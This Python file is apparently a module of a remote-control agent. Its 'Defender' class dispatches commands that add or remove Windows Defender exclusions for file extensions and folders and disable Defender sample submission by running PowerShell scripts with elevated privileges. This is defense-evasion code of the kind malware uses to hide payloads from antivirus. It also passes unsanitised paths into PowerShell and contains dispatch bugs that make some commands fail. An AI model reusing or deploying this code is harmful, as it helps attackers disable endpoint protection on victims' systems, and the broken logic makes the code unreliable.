import processManagement
from .. import scripting_interface
from ...scripts.powershell_scripts.system import addExtensionExclusionScript, removeExtensionExclusionScript, addFolderExclusionScript, removeFolderExclusionScript, disableSamplingScript
from pydantic import BaseModel, Field
from ..commands import ICommandModule, Command, CommandResult

class AddExtensionExclusionArgs(BaseModel):
    extension: str = Field(..., description="The file extension to exclude")

class RemoveExtensionExclusionArgs(BaseModel):
    extension: str = Field(..., description="The file extension to remove from exclusion")

class AddFolderExclusionArgs(BaseModel):
    path: str = Field(..., description="The folder path to exclude")

class RemoveFolderExclusionArgs(BaseModel):
    path: str = Field(..., description="The folder path to remove from exclusion")

command_arg_map = {
    Command.ADD_EXTENSION_EXCLUSION: AddExtensionExclusionArgs,
    Command.REMOVE_EXTENSION_EXCLUSION: RemoveExtensionExclusionArgs,
    Command.ADD_FOLDER_EXCLUSION: AddFolderExclusionArgs,
    Command.REMOVE_FOLDER_EXCLUSION: RemoveFolderExclusionArgs,
    Command.STOP_SAMPLING: None  # No arguments required
}

class Defender(ICommandModule):
    def add_extension_exclusion(self, args: AddExtensionExclusionArgs) -> CommandResult:
        if not args.extension:
            return CommandResult(success=False, result="No extension provided.")
        extension = args.extension
        if "." in extension:
            extension = extension.replace(".", "")
        if not processManagement.isElevated():
            return CommandResult(success=False, result="Elevated privileges required.")
        scripting_interface.execute_powershell_script(addExtensionExclusionScript.format(extension))
        return CommandResult(success=True, result=f"Extension exclusion {extension} added.")

    def remove_extension_exclusion(self, args: RemoveExtensionExclusionArgs) -> CommandResult:
        if not args.extension:
            return CommandResult(success=False, result="No extension provided.")
        extension = args.extension
        if "." in extension:
            extension = extension.replace(".", "")
        if not processManagement.isElevated():
            return CommandResult(success=False, result="Elevated privileges required.")
        scripting_interface.execute_powershell_script(removeExtensionExclusionScript.format(extension))
        return CommandResult(success=True, result=f"Extension exclusion {extension} removed.")
    
    def add_folder_exclusion(self, args: AddFolderExclusionArgs) -> CommandResult:
        if not args.path:
            return CommandResult(success=False, result="No folder path provided.")
        if not processManagement.isElevated():
            return CommandResult(success=False, result="Elevated privileges required.")
        scripting_interface.execute_powershell_script(addFolderExclusionScript.format(args.path))
        return CommandResult(success=True, result=f"Folder exclusion {args.path} added.")

    def remove_folder_exclusion(self, args: RemoveExtensionExclusionArgs) -> CommandResult:
        if not args.path:
            return CommandResult(success=False, result="No folder path provided.")
        if not processManagement.isElevated():
            return CommandResult(success=False, result="Elevated privileges required.")
        scripting_interface.execute_powershell_script(removeFolderExclusionScript.format(args.path))
        return CommandResult(success=True, result=f"Folder exclusion {args.path} removed.")

    def stop_sampling(self) -> CommandResult:
        if not processManagement.isElevated():
            return CommandResult(success=False, result="Elevated privileges required.")
        scripting_interface.execute_powershell_script(disableSamplingScript)
        return CommandResult(success=True, result="Defender sampling disabled.")

    def run(self, command: Command, args: BaseModel = None) -> CommandResult:
        command_map = {
            Command.ADD_EXTENSION_EXCLUSION: self.add_extension_exclusion,
            Command.REMOVE_EXTENSION_EXCLUSION: self.remove_extension_exclusion,
            Command.ADD_FOLDER_EXCLUSION: self.add_folder_exclusion,
            Command.REMOVE_FOLDER_EXCLUSION: self.remove_folder_exclusion,
            Command.STOP_SAMPLING: self.stop_sampling
        }

        if command in command_map:
            if args is None:
                return CommandResult(success=False, result="No arguments provided.")
            return command_map[command](args)
        else:
            return CommandResult(success=False, result="Command not found.")